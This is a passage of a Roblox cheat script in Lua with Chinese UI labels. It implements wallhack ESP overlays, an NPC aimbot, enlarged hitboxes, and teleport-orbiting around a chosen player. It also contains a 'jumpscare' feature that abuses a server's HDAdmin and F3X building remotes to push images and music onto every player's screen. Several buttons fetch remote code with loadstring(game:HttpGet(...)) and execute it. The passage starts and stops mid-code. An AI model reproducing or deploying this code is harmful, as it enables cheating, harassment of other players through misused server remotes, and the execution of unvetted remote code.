local angle = math.deg(math.atan2(delta.Y, delta.X))
local midPoint = (startPoint + endPoint)/2
line.Size = UDim2.new(0,length,0,thick)
line.Position = UDim2.new(0,midPoint.X,0,midPoint.Y)
line.Rotation = angle
line.Parent = gui
table.insert(lineTable,line)
end
if state then
if not _G.lineColor then _G.lineColor = Color3.new(1,0.4,0) end
if not _G.lineThickness then _G.lineThickness = 2 end
if not _G.lineTrans then _G.lineTrans = 0 end
removeAllLines()
conn = RunService.Heartbeat:Connect(function()
removeAllLines()
local time = tick()
local lineC
if _G.rainbowLine then
lineC = Color3.fromHSV((time*0.6)%1,1,1)
else
lineC = _G.lineColor
end
for _,obj in workspace:GetDescendants() do
if obj:IsA("Model") then
local hum = obj:FindFirstChildOfClass("Humanoid")
local root = obj:FindFirstChild("HumanoidRootPart")
if hum and root and obj~=LocalPlayer.Character then
drawLine(root,lineC,_G.lineThickness,_G.lineTrans)
end
end
end
end)
else
if conn then conn:Disconnect() end
removeAllLines()
end
end
})
Tabs.NpcEspTab:Toggle({
Title = "NPC名字透视",
Default = false,
Callback = function(state)
_G.nameEsp = state
end
})
Tabs.NpcEspTab:Toggle({
Title = "距离透视文字",
Default = false,
Callback = function(state)
_G.distEsp = state
end
})
Tabs.NpcEspTab:Toggle({
Title = "NPC血条透视",
Default = false,
Callback = function(state)
_G.barEsp = state
end
})
Tabs.NpcEspTab:Input({
Title = "透视文字大小",
Default = "14",
Callback = function(val)
local num = tonumber(val)
if num then
_G.espTextSize = math.clamp(num,8,24)
end
end
})
Tabs.NpcEspTab:Toggle({
Title = "全部透视文字",
Default = false,
Callback = function(state)
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local conn
local uiTable = {}
local function removeAllUi()
for _,ui in uiTable do
if ui then ui:Destroy() end
end
table.clear(uiTable)
end
local function drawEsp(model,hum,root)
local gui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("EspTextGui") or Instance.new("ScreenGui")
gui.Name = "EspTextGui"
gui.Parent = LocalPlayer.PlayerGui
local screenPos,visible = Camera:WorldToViewportPoint(root.Position)
local viewportSize = Camera.ViewportSize
local camPos = Camera.CFrame.Position
local dist = math.floor((root.Position - camPos).Magnitude)
local offsetY = -30
if _G.nameEsp then
local nameLabel = Instance.new("TextLabel")
nameLabel.BackgroundTransparency = 1
nameLabel.Text = model.Name
nameLabel.TextSize = _G.espTextSize
nameLabel.TextColor3 = Color3.new(1,1,1)
nameLabel.Position = UDim2.new(0,screenPos.X,0,screenPos.Y+offsetY)
nameLabel.AnchorPoint = Vector2.new(0.5,0.5)
nameLabel.ZIndex = 100
nameLabel.Parent = gui
table.insert(uiTable,nameLabel)
offsetY = offsetY + 18
end
if _G.distEsp then
local distLabel = Instance.new("TextLabel")
distLabel.BackgroundTransparency = 1
distLabel.Text = dist.."m"
distLabel.TextSize = _G.espTextSize
distLabel.TextColor3 = Color3.new(0,1,0)
distLabel.Position = UDim2.new(0,screenPos.X,0,screenPos.Y+offsetY)
distLabel.AnchorPoint = Vector2.new(0.5,0.5)
distLabel.ZIndex = 100
distLabel.Parent = gui
table.insert(uiTable,distLabel)
offsetY = offsetY + 18
end
if _G.barEsp then
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0,40,0,6)
barBg.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
barBg.BackgroundTransparency = 0.2
barBg.Position = UDim2.new(0,screenPos.X,0,screenPos.Y+offsetY)
barBg.AnchorPoint = Vector2.new(0.5,0.5)
barBg.ZIndex = 100
barBg.Parent = gui
table.insert(uiTable,barBg)
local fill = Instance.new("Frame")
fill.Size = UDim2.new(0,40*(hum.Health/hum.MaxHealth),1,0)
fill.BackgroundColor3 = Color3.new(0,1,0)
fill.BorderSizePixel = 0
fill.ZIndex = 101
fill.Parent = barBg
table.insert(uiTable,fill)
end
end
if state then
if not _G.espTextSize then _G.espTextSize =14 end
removeAllUi()
conn = RunService.Heartbeat:Connect(function()
removeAllUi()
for _,obj in workspace:GetDescendants() do
if obj:IsA("Model") then
local hum = obj:FindFirstChildOfClass("Humanoid")
local root = obj:FindFirstChild("HumanoidRootPart")
if hum and root and obj~=LocalPlayer.Character then
drawEsp(obj,hum,root)
end
end
end
end)
else
if conn then conn:Disconnect() end
removeAllUi()
end
end
})

Tabs.NpcAimTab:Section({Title = "NPC自瞄设置"})

Tabs.NpcAimTab:Input({
    Title = "FOV(圈圈&自瞄范围)",
    Default = "600",
    Callback = function() end
})

Tabs.NpcAimTab:Input({
    Title = "瞄准圈线条粗细",
    Default = "2",
    Callback = function() end
})

Tabs.NpcAimTab:Colorpicker({
    Title = "圈圈固定颜色",
    Default = Color3.fromRGB(128,0,128),
    Callback = function(color)
        _G.NpcAim_RingColor = color
    end
})

Tabs.NpcAimTab:Toggle({
    Title = "彩虹圈圈",
    Default = false,
    Callback = function(state)
        _G.NpcAim_Rainbow = state
    end
})

Tabs.NpcAimTab:Button({
    Title = "读取输入框参数",
    Callback = function()
        local fovInput = Tabs.NpcAimTab:GetInput("FOV(圈圈&自瞄范围)")
        local thickInput = Tabs.NpcAimTab:GetInput("瞄准圈线条粗细")
        _G.NpcAim_FOV = math.clamp(tonumber(fovInput) or 600,10,2000)
        _G.NpcAim_RingThick = math.clamp(tonumber(thickInput) or 2,0.5,10)
    end
})

Tabs.NpcAimTab:Button({
    Title = "强制清除圈圈&自瞄",
    Callback = function()
        if _G.NpcAim_RenderConn then
            _G.NpcAim_RenderConn:Disconnect()
            _G.NpcAim_RenderConn = nil
        end
        if _G.NpcAim_FOVring then
            _G.NpcAim_FOVring:Remove()
            _G.NpcAim_FOVring = nil
        end
    end
})

Tabs.NpcAimTab:Toggle({
    Title = "启用NPC自瞄",
    Icon = "check",
    Default = false,
    Callback = function(v)
        local RunService = game:GetService("RunService")
        local Workspace = game:GetService("Workspace")
        local Cam = Workspace.CurrentCamera

        _G.NpcAim_FOV = _G.NpcAim_FOV or 600
        _G.NpcAim_RingThick = _G.NpcAim_RingThick or 2
        _G.NpcAim_RingColor = _G.NpcAim_RingColor or Color3.fromRGB(128,0,128)
        _G.NpcAim_Rainbow = _G.NpcAim_Rainbow or false
        _G.NpcAim_RenderConn = _G.NpcAim_RenderConn or nil

        local function CreateRing()
            if _G.NpcAim_FOVring then
                _G.NpcAim_FOVring:Remove()
            end
            _G.NpcAim_FOVring = Drawing.new("Circle")
            _G.NpcAim_FOVring.Visible = true
            _G.NpcAim_FOVring.Filled = false
        end

        local function updateDrawings()
            local fov = _G.NpcAim_FOV
            local thick = _G.NpcAim_RingThick
            local camViewportSize = Cam.ViewportSize

            _G.NpcAim_FOVring.Position = camViewportSize / 2
            _G.NpcAim_FOVring.Radius = fov * 0.35
            _G.NpcAim_FOVring.Thickness = thick

            if _G.NpcAim_Rainbow then
                local hue = (os.clock() % 10) / 10
                _G.NpcAim_FOVring.Color = Color3.fromHSV(hue, 1, 1)
            else
                _G.NpcAim_FOVring.Color = _G.NpcAim_RingColor
            end
        end

        local function lookAt(targetPos)
            local lookVector = (targetPos - Cam.CFrame.Position).Unit
            local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
            Cam.CFrame = newCFrame
        end

        local function getClosestNpcInFOV()
            local nearestHead = nil
            local minDist = math.huge
            local screenCenter = Cam.ViewportSize / 2
            local fov = _G.NpcAim_FOV

            for _, model in ipairs(Workspace:GetDescendants()) do
                if model:IsA("Model") then
                    local hum = model:FindFirstChildOfClass("Humanoid")
                    local head = model:FindFirstChild("Head")
                    local isPlayerChar = false
                    for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
                        if model == plr.Character then
                            isPlayerChar = true
                            break
                        end
                    end
                    if isPlayerChar then continue end
                    if hum and head and hum.Health > 0 then
                        local screenPos, onScreen = Cam:WorldToViewportPoint(head.Position)
                        local dist = (Vector2.new(screenPos.X, screenPos.Y) - screenCenter).Magnitude
                        if onScreen and dist < minDist and dist < fov then
                            minDist = dist
                            nearestHead = head
                        end
                    end
                end
            end
            return nearestHead
        end

        if v then
            CreateRing()
            if _G.NpcAim_RenderConn then
                _G.NpcAim_RenderConn:Disconnect()
            end
            _G.NpcAim_RenderConn = RunService.RenderStepped:Connect(function()
                updateDrawings()
                local targetHead = getClosestNpcInFOV()
                if targetHead then
                    lookAt(targetHead.Position)
                end
            end)
        else
            if _G.NpcAim_RenderConn then
                _G.NpcAim_RenderConn:Disconnect()
                _G.NpcAim_RenderConn = nil
            end
            if _G.NpcAim_FOVring then
                _G.NpcAim_FOVring:Remove()
                _G.NpcAim_FOVring = nil
            end
        end
    end
})

Tabs.Music:Section({Title = "外部音乐播放器"})

Tabs.Music:Input({
    Title = "音频链接",
    Default = "https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/main/%E7%BC%93%E7%BC%93%E9%A3%98%E8%90%BD%E7%9A%84%E6%9E%AB%E5%8F%B6%E5%83%8F%E6%80%9D%E5%BF%B5%20%23%E5%91%A8%E6%9D%B0%E4%BC%A6%20%23%E5%91%A8%E6%9D%B0%E4%BC%A6%E6%9E%AB%20%23%E5%91%A8%E6%9D%B0%E4%BC%A6%E9%9F%B3%E4%B9%90%20%23%E5%91%A8%E6%9D%B0%E4%BC%A6%E6%AD%8C%E6%9B%B2%E6%8E%A8%E8%8D%90_01102026.mp3",
    Callback = function() end
})

Tabs.Music:Input({
    Title = "音量(0-1)",
    Default = "0.6",
    Callback = function() end
})

Tabs.Music:Toggle({
    Title = "循环播放",
    Default = true,
    Callback = function(state)
        _G.AudioLoopState = state
    end
})

Tabs.Music:Button({
    Title = "▶播放音频",
    Callback = function()
        local URL = Tabs.Music:GetInput("音频链接")
        local FNAME = "enjoy_tmp_audio.wav"
        local getasset = getcustomasset or getsynasset
        _G.players = _G.players or {}
        local players = _G.players

        -- 停止并销毁旧音频
        if players["bgm"] then
            pcall(function()
                players["bgm"]:Stop()
                players["bgm"]:Destroy()
                players["bgm"] = nil
            end)
        end

        local okAssert = pcall(function()
            assert(game.HttpGet and writefile and isfile and getasset, "当前 executor 不支持 HttpGet/writefile/getcustomasset")
        end)
        if not okAssert then
            warn("执行器缺少文件读写支持")
            return
        end

        if not isfile(FNAME) then
            local ok, data = pcall(function() return game:HttpGet(URL, true) end)
            if not ok or not data or #data < 100 then
                warn("下载失败")
                return
            end
            writefile(FNAME, data)
        end

        local content = getasset(FNAME)
        local vol = math.clamp(tonumber(Tabs.Music:GetInput("音量(0-1)")) or 0.6,0,1)
        local loop = _G.AudioLoopState ~= nil and _G.AudioLoopState or true

        local snd = Instance.new("Sound")
        snd.SoundId = content
        snd.Volume = vol
        snd.Looped = loop
        snd.PlaybackSpeed = 1
        snd.Parent = game:GetService("SoundService")
        snd:Play()

        snd.Ended:Once(function()
            if not snd.Looped then
                pcall(function()
                    snd:Destroy()
                    players["bgm"] = nil
                end)
            end
        end)
        players["bgm"] = snd
    end
})

Tabs.Music:Button({
    Title = "⏹停止音频",
    Callback = function()
        _G.players = _G.players or {}
        local players = _G.players
        if players["bgm"] then
            pcall(function()
                players["bgm"]:Stop()
                players["bgm"]:Destroy()
                players["bgm"] = nil
            end)
        end
    end
})

getgenv().F3x_JmpImage = "109195003073445"
getgenv().F3x_JmpSound = "6018028320"
getgenv().F3x_JmpSeconds = 10

Tabs.F3xTab:Section({Title = "HDAdmin惊吓弹窗"})

Tabs.F3xTab:Input({
    Title = "惊吓图片AssetID",
    Value = getgenv().F3x_JmpImage,
    Placeholder = "填入图片ID数字",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().F3x_JmpImage = s
    end
})

Tabs.F3xTab:Input({
    Title = "惊吓音效AssetID",
    Value = getgenv().F3x_JmpSound,
    Placeholder = "填入音效ID数字",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().F3x_JmpSound = s
    end
})

Tabs.F3xTab:Input({
    Title = "惊吓持续秒数",
    Value = tostring(getgenv().F3x_JmpSeconds),
    Placeholder = "数字，例如10",
    Callback = function(text)
        local num = tonumber(text:gsub("%s",""))
        if num then getgenv().F3x_JmpSeconds = num end
    end
})

Tabs.F3xTab:Button({
    Title = "执行一次惊吓弹窗",
    Callback = function()
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local LocalPlayer = Players.LocalPlayer

        local image = getgenv().F3x_JmpImage
        local sound = getgenv().F3x_JmpSound
        local seconds = getgenv().F3x_JmpSeconds

        local RequestCommand = nil
        local tool = nil

        local okGetRemote = pcall(function()
            RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
            RequestCommand:InvokeServer(";music ".. sound)
        end)
        if not okGetRemote or not RequestCommand then
            WindUI:Notify({
                Title = "F3x｜惊吓弹窗",
                Content = "❌ 找不到HDAdminHDClient，服务器没有HDAdmin！",
                Duration = 3
            })
            return
        end

        for _,v in LocalPlayer:GetDescendants() do
            if v.Name == "SyncAPI" then tool = v.Parent end
        end
        if not tool then
            for _,v in ReplicatedStorage:GetDescendants() do
                if v.Name == "SyncAPI" then tool = v.Parent end
            end
        end
        if not tool or not tool:FindFirstChild("SyncAPI") or not tool.SyncAPI:FindFirstChild("ServerEndpoint") then
            WindUI:Notify({
                Title = "F3x｜惊吓弹窗",
                Content = "❌ 未找到SyncAPI，此服务器不支持该功能",
                Duration = 3
            })
            return
        end

        local remote = tool.SyncAPI.ServerEndpoint
        local function fireRemote(args)
            remote:InvokeServer(unpack(args))
        end

        WindUI:Notify({
            Title = "F3x｜惊吓弹窗",
            Content = "✅ 已触发惊吓，等待倒计时结束自动清除",
            Duration = 2
        })

        for _, targetPlayer in ipairs(Players:GetPlayers()) do
            task.spawn(function()
                local spawnCF = workspace.CurrentCamera.CFrame * CFrame.new(0, 0, -2) * CFrame.Angles(math.rad(90), 0, 0)
                fireRemote({"CreatePart", "Normal", spawnCF, workspace})

                local p = nil
                local children = workspace:GetChildren()
                for i = #children, 1, -1 do
                    if children[i].Name == "Part" and (children[i].Position - spawnCF.p).Magnitude < 5 then
                        p = children[i]
                        break
                    end
                end
                if not p then return end

                p.CanCollide = false
                p.CastShadow = true
                fireRemote({"SetName", {p}, "Jumpscare" .. targetPlayer.Name})
                fireRemote({"SyncMaterial", {{["Part"] = p, ["Transparency"] = 1}}})
                fireRemote({"SyncResize", {{["Part"] = p, ["CFrame"] = p.CFrame, ["Size"] = Vector3.new(6.3, 3, 0.1)}}})
                fireRemote({"SetLocked", {p}, true})
                fireRemote({"CreateTextures", {{["Part"] = p, ["Face"] = Enum.NormalId.Front, ["TextureType"] = "Decal"}}})
                fireRemote({"SyncTexture", {{["Part"] = p, ["Face"] = Enum.NormalId.Front, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://"..tostring(image)}}})

                local connection
                local startTime = tick()
                connection = RunService.Heartbeat:Connect(function()
                    if tick() - startTime > seconds then
                        connection:Disconnect()
                        fireRemote({"Remove", {p}})
                        pcall(function() RequestCommand:InvokeServer(";unmusic") end)
                        return
                    end
                    if p and p.Parent then
                        local followCF = workspace.CurrentCamera.CFrame * CFrame.new(0, 0, -2) * CFrame.Angles(math.rad(180), 0, math.rad(-180))
                        fireRemote({"SyncMove", {{["Part"] = p, ["CFrame"] = followCF}}})
                    else
                        connection:Disconnect()
                    end
                end)
            end)
        end
    end
})

Tabs.GodWhy:Paragraph({
    Title = "声明",
    Desc = "作者声明:脚本免费公开",
    Thumbnail = "rbxassetid://104488234583316",
    ThumbnailSize = 80
})

Tabs.GodWhy:Paragraph({
    Title = "国庆节快乐",
    Desc = "😍😍😍",
    Image = "rbxassetid://135461405245048",
    ImageSize = 20
})

Tabs.NpcRangeTab:Section({Title = "NPC范围放大"})

Tabs.NpcRangeTab:Input({
    Title = "放大范围",
    Value = 100,
    Placeholder = "输入大小数字",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().NpcHeadSize = num
        end
    end
})

Tabs.NpcRangeTab:Input({
    Title = "透明度",
    Value = 0.7,
    Placeholder = "0完全透明 ~ 1不透明",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().NpcTransparency = math.clamp(num,0,1)
        end
    end
})

Tabs.NpcRangeTab:Dropdown({
    Title = "材质选择",
    Values = {"Neon", "Plastic", "Metal", "SmoothPlastic", "Glass", "ForceField"},
    Value = "Neon",
    Callback = function(selected)
        getgenv().NpcMaterial = Enum.Material[selected]
    end
})

Tabs.NpcRangeTab:Toggle({
    Title = "根部件碰撞(CanCollide)",
    Value = false,
    Callback = function(state)
        getgenv().NpcCanCollide = state
    end
})

Tabs.NpcRangeTab:Toggle({
    Title = "开启NPC范围放大",
    Value = false,
    Callback = function(state)
        getgenv().NpcHeadSize = 100
        getgenv().NpcTransparency = 0.7
        getgenv().NpcMaterial = Enum.Material.Neon
        getgenv().NpcCanCollide = false
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local connection
        if state then
            connection = RunService.RenderStepped:Connect(function()
                local hue = tick() % 1
                for _, model in ipairs(workspace:GetDescendants()) do
                    if model:IsA("Model") then
                        local hum = model:FindFirstChildOfClass("Humanoid")
                        if hum and not Players:GetPlayerFromCharacter(model) then
                            pcall(function()
                                local hrp = model.HumanoidRootPart
                                if not hrp:GetAttribute("NpcOriginalSet") then
                                    hrp:SetAttribute("NpcOriginalSize", hrp.Size)
                                    hrp:SetAttribute("NpcOriginalTrans", hrp.Transparency)
                                    hrp:SetAttribute("NpcOriginalColor", hrp.BrickColor.Color)
                                    hrp:SetAttribute("NpcOriginalMat", hrp.Material.Name)
                                    hrp:SetAttribute("NpcOriginalCollide", hrp.CanCollide)
                                    hrp:SetAttribute("NpcOriginalSet", true)
                                end
                                hrp.Size = Vector3.new(getgenv().NpcHeadSize,getgenv().NpcHeadSize,getgenv().NpcHeadSize)
                                hrp.Transparency = getgenv().NpcTransparency
                                if getgenv().NpcRainbow then
                                    hrp.BrickColor = BrickColor.new(Color3.fromHSV(hue,1,1))
                                else
                                    hrp.BrickColor = BrickColor.new(getgenv().NpcCustomColor)
                                end
                                hrp.Material = getgenv().NpcMaterial
                                hrp.CanCollide = getgenv().NpcCanCollide
                            end)
                        end
                    end
                end
            end)
            getgenv().NpcConnection = connection
        else
            if getgenv().NpcConnection then
                getgenv().NpcConnection:Disconnect()
                getgenv().NpcConnection = nil
            end
            for _, model in ipairs(workspace:GetDescendants()) do
                if model:IsA("Model") then
                    local hum = model:FindFirstChildOfClass("Humanoid")
                    if hum and not Players:GetPlayerFromCharacter(model) then
                        pcall(function()
                            local hrp = model.HumanoidRootPart
                            if hrp:GetAttribute("NpcOriginalSet") then
                                hrp.Size = hrp:GetAttribute("NpcOriginalSize")
                                hrp.Transparency = hrp:GetAttribute("NpcOriginalTrans")
                                hrp.BrickColor = BrickColor.new(hrp:GetAttribute("NpcOriginalColor"))
                                hrp.Material = Enum.Material[hrp:GetAttribute("NpcOriginalMat")]
                                hrp.CanCollide = hrp:GetAttribute("NpcOriginalCollide")
                                hrp:SetAttribute("NpcOriginalSet", nil)
                            end
                        end)
                    end
                end
            end
        end
    end
})

Tabs.NpcRangeTab:Toggle({
    Title = "彩虹颜色",
    Value = false,
    Callback = function(state)
        getgenv().NpcRainbow = state
    end
})

Tabs.PlayerRangeTab:Section({Title = "玩家根部件可视化方框"})

Tabs.PlayerRangeTab:Input({
    Title = "方框尺寸",
    Value = 100,
    Placeholder = "输入方框大小",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().PlayerBoxSize = num
        end
    end
})

Tabs.PlayerRangeTab:Input({
    Title = "透明度",
    Value = 0.7,
    Placeholder = "0完全透明 ~ 1不透明",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().PlayerBoxTransparency = math.clamp(num,0,1)
        end
    end
})

Tabs.PlayerRangeTab:Dropdown({
    Title = "材质选择",
    Values = {"Neon", "Plastic", "Metal", "SmoothPlastic", "Glass", "ForceField"},
    Value = "Neon",
    Callback = function(selected)
        getgenv().PlayerBoxMaterial = Enum.Material[selected]
    end
})

Tabs.PlayerRangeTab:Toggle({
    Title = "开启玩家方框",
    Value = false,
    Callback = function(state)
        getgenv().PlayerBoxSize = 100
        getgenv().PlayerBoxTransparency = 0.7
        getgenv().PlayerBoxMaterial = Enum.Material.Neon
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local connection
        local boxCache = {}
        if state then
            connection = RunService.RenderStepped:Connect(function()
                local hue = tick() % 1
                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr ~= Players.LocalPlayer then
                        local char = plr.Character
                        if char then
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                if not boxCache[plr] then
                                    local newBox = Instance.new("Part")
                                    newBox.Name = "PlayerVisualBox"
                                    newBox.Anchored = true
                                    newBox.CanCollide = false
                                    newBox.CanTouch = false
                                    newBox.Parent = workspace
                                    boxCache[plr] = newBox
                                end
                                local box = boxCache[plr]
                                box.Size = Vector3.new(getgenv().PlayerBoxSize,getgenv().PlayerBoxSize,getgenv().PlayerBoxSize)
                                box.Transparency = getgenv().PlayerBoxTransparency
                                if getgenv().PlayerRainbow then
                                    box.BrickColor = BrickColor.new(Color3.fromHSV(hue,1,1))
                                end
                                box.Material = getgenv().PlayerBoxMaterial
                                box.CFrame = hrp.CFrame
                            end
                        end
                    end
                end
            end)
            getgenv().PlayerBoxConnection = connection
            getgenv().PlayerBoxCache = boxCache
        else
            if getgenv().PlayerBoxConnection then
                getgenv().PlayerBoxConnection:Disconnect()
                getgenv().PlayerBoxConnection = nil
            end
            if getgenv().PlayerBoxCache then
                for _,box in pairs(getgenv().PlayerBoxCache) do
                    pcall(function() box:Destroy() end)
                end
                getgenv().PlayerBoxCache = nil
            end
        end
    end
})

Tabs.PlayerRangeTab:Toggle({
    Title = "彩虹颜色",
    Value = false,
    Callback = function(state)
        getgenv().PlayerRainbow = state
    end
})

local PlayerOrbitDropdown

Tabs.PlayerOrbitTab:Section({Title = "玩家环绕功能"})

Tabs.PlayerOrbitTab:Button({
    Title = "刷新玩家列表",
    Callback = function()
        local list = {}
        for _,v in ipairs(game:GetService("Players"):GetPlayers()) do
            table.insert(list, v.Name)
        end
        PlayerOrbitDropdown:Refresh(list)
    end
})

PlayerOrbitDropdown = Tabs.PlayerOrbitTab:Dropdown({
    Title = "选择玩家",
    Values = {},
    Callback = function(selected)
        getgenv().OrbitTargetName = selected
    end
})

Tabs.PlayerOrbitTab:Input({
    Title = "环绕半径",
    Value = "12",
    Placeholder = "默认12",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().OrbitRadius = num
        end
    end
})

Tabs.PlayerOrbitTab:Input({
    Title = "环绕高度",
    Value = "8",
    Placeholder = "默认8",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().OrbitHeight = num
        end
    end
})

Tabs.PlayerOrbitTab:Input({
    Title = "环绕速度",
    Value = "2",
    Placeholder = "默认2",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            getgenv().OrbitSpeed = num
        end
    end
})

Tabs.PlayerOrbitTab:Toggle({
    Title = "相机看向目标",
    Value = false,
    Callback = function(state)
        getgenv().OrbitCamLock = state
    end
})

Tabs.PlayerOrbitTab:Toggle({
    Title = "开启玩家环绕",
    Value = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local Workspace = game:GetService("Workspace")
        local LocalPlayer = Players.LocalPlayer
        local bindName = "PlayerOrbitBind"
        getgenv().OrbitActive = state
        if state then
            RunService:BindToRenderStep(bindName, Enum.RenderPriority.Camera.Value + 1, function()
                if not getgenv().OrbitActive then return end
                local targetPlayer = Players:FindFirstChild(getgenv().OrbitTargetName)
                if not targetPlayer or not targetPlayer.Character then return end
                local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not targetHRP then return end
                if not LocalPlayer.Character then return end
                local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not myHRP then return end
                local angle = os.clock() * (getgenv().OrbitSpeed or 2)
                local radius = getgenv().OrbitRadius or 12
                local height = getgenv().OrbitHeight or 8
                local offset = Vector3.new(math.cos(angle)*radius, height, math.sin(angle)*radius)
                myHRP.CFrame = CFrame.new(targetHRP.Position + offset, targetHRP.Position)
                if getgenv().OrbitCamLock then
                    Workspace.CurrentCamera.CFrame = CFrame.lookAt(Workspace.CurrentCamera.CFrame.Position, targetHRP.Position)
                end
            end)
        else
            RunService:UnbindFromRenderStep(bindName)
        end
    end
})

Tabs.DevToolsTab:Section({Title = "开发工具"})

Tabs.DevToolsTab:Button({
	Title = "Dex Explorer V3",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Developer-Tool/refs/heads/main/Dex-V3"))()
	end
})

Tabs.DevToolsTab:Button({
	Title = "Dex Explorer V4",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Developer-Tool/refs/heads/main/Dex-V4"))()
	end
})

Tabs.DevToolsTab:Button({
	Title = "Dex Explorer反编译库外接",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Developer-Tool/refs/heads/main/Dex-Explorer-TX-Fixed.lua"))()
	end
})

Tabs.DevToolsTab:Button({
	Title = "Cobalt",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Developer-Tool/refs/heads/main/Cobalt"))()
	end
})

Tabs.DevToolsTab:Button({
	Title = "Cobalt反编译库外接",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Developer-Tool/refs/heads/main/Cobalt-Decompile-lua-expert"))()
	end
})

Tabs.DevToolsTab:Button({
	Title = "SimpleSpy V2.2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Developer-Tool/refs/heads/main/SimpleSpy-V2.2"))()
	end
})

Tabs.XrayTab:Section({Title = "骨骼线透视"})

getgenv().BoneESP_Active = false
getgenv().BoneColor = Color3.new(0,1,1)
getgenv().BoneRainbow = false
local SkeletonLines = {}
local function ClearAllLines()
	for _,line in pairs(SkeletonLines) do
		pcall(function() line:Remove() end)
	end
	table.clear(SkeletonLines)
end
local function NewDrawLine()
	local l = Drawing.new("Line")
	l.Thickness = 2
	l.Color = getgenv().BoneColor
	l.Transparency = 1
	l.Visible = false
	table.insert(SkeletonLines,l)
	return l
end
local BoneList = {
	R6 = {
		{"Head","Torso"},
		{"Torso","Left Arm"},
		{"Torso","Right Arm"},
		{"Torso","Left Leg"},
		{"Torso","Right Leg"},
	},
	R15 = {
		{"Head","UpperTorso"},
		{"UpperTorso","LowerTorso"},
		{"UpperTorso","LeftUpperArm"},
		{"LeftUpperArm","LeftLowerArm"},
		{"LeftLowerArm","LeftHand"},
		{"UpperTorso","RightUpperArm"},
		{"RightUpperArm","RightLowerArm"},
		{"RightLowerArm","RightHand"},
		{"LowerTorso","LeftUpperLeg"},
		{"LeftUpperLeg","LeftLowerLeg"},
		{"LeftLowerLeg","LeftFoot"},
		{"LowerTorso","RightUpperLeg"},
		{"RightUpperLeg","RightLowerLeg"},
		{"RightLowerLeg","RightFoot"},
	}
}
task.spawn(function()
	local Camera = workspace.CurrentCamera
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local hue = 0
	while task.wait(0.01) do
		if getgenv().BoneRainbow then
			hue += 0.008
			if hue >=1 then hue = 0 end
			getgenv().BoneColor = Color3.fromHSV(hue,1,1)
		end
		if not getgenv().BoneESP_Active then
			ClearAllLines()
			continue
		end
		local index = 1
		for _,plr in ipairs(Players:GetPlayers()) do
			if plr == LocalPlayer then continue end
			local char = plr.Character
			if not char then continue end
			local hum = char:FindFirstChildOfClass("Humanoid")
			if not hum or hum.Health <= 0 then continue end
			local boneSet
			if char:FindFirstChild("UpperTorso") then
				boneSet = BoneList.R15
			else
				boneSet = BoneList.R6
			end
			for _,pair in ipairs(boneSet) do
				local p1 = char:FindFirstChild(pair[1])
				local p2 = char:FindFirstChild(pair[2])
				if not p1 or not p2 then continue end
				local pos1,vis1 = Camera:WorldToViewportPoint(p1.Position)
				local pos2,vis2 = Camera:WorldToViewportPoint(p2.Position)
				local line = SkeletonLines[index] or NewDrawLine()
				line.Color = getgenv().BoneColor
				line.From = Vector2.new(pos1.X,pos1.Y)
				line.To = Vector2.new(pos2.X,pos2.Y)
				line.Visible = vis1 and vis2
				index +=1
			end
		end
		for i = index,#SkeletonLines do
			SkeletonLines[i].Visible = false
		end
	end
end)

Tabs.XrayTab:Toggle({
	Title = "骨骼透视",
	Value = false,
	Callback = function(state)
		getgenv().BoneESP_Active = state
	end
})

Tabs.XrayTab:Colorpicker({
	Title = "骨骼线条颜色",
	Default = Color3.new(0,1,1),
	Callback = function(color)
		getgenv().BoneColor = color
	end
})

Tabs.XrayTab:Toggle({
	Title = "彩虹骨骼",
	Value = false,
	Callback = function(state)
		getgenv().BoneRainbow = state
	end
})

Tabs.XrayTab:Section({Title = "2d方框"})

pcall(function()
    getgenv().Box2D_Active = false
    getgenv().BoxColor = Color3.new(0,1,1)
    getgenv().BoxRainbow = false
    getgenv().BoxThickness = 2

    local BoxLines = {}
    local function ClearBoxLines()
        for _,line in pairs(BoxLines) do
            pcall(function() line:Remove() end)
        end
        table.clear(BoxLines)
    end
    local function NewBoxLine()
        local l = Drawing.new("Line")
        l.Thickness = getgenv().BoxThickness
        l.Color = getgenv().BoxColor
        l.Transparency = 1
        l.Visible = false
        table.insert(BoxLines,l)
        return l
    end

    task.spawn(function()
        local Camera = workspace.CurrentCamera
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
